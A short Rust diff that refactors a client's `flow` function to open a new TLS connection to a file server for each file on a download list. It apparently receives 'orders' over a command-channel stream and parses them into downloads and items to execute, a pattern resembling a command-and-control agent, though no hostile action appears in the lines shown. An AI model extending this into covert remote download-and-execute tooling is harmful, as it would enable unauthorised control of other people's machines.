@@ -5,9 +5,10 @@ mod write_order;
 mod parse_order;
 
 use std::net::TcpStream;
-use openssl::ssl::SslStream;
+use openssl::ssl::{SslStream, SslConnector};
+use std::net::SocketAddr;
 
-pub fn flow(stream_cc: SslStream<TcpStream>, mut stream_fs: SslStream<TcpStream>, number_while: u64) {
+pub fn flow(stream_cc: SslStream<TcpStream>, ip_addr: String, fs_sock: SocketAddr, connector: SslConnector, number_while: u64) {
     println!("Could connect to server!");
 
     let order;
@@ -24,8 +25,13 @@ pub fn flow(stream_cc: SslStream<TcpStream>, mut stream_fs: SslStream<TcpStream>
     let list_contents_exec = parse_order::get_to_exec(contents);
 
     for string in list_contents_download {
+        if let Ok(stream_fs) = TcpStream::connect(fs_sock) {
+            let stream_fs = connector.connect(ip_addr.to_string().as_str(),stream_fs).unwrap();
     
-        stream_fs = handle_connection_fs::handle_connection_fs(stream_fs, &string);
+            handle_connection_fs::handle_connection_fs(stream_fs, &string);
+        } else {
+            println!("problem downloading file {} from server.", string);
+        }
 
     }
 
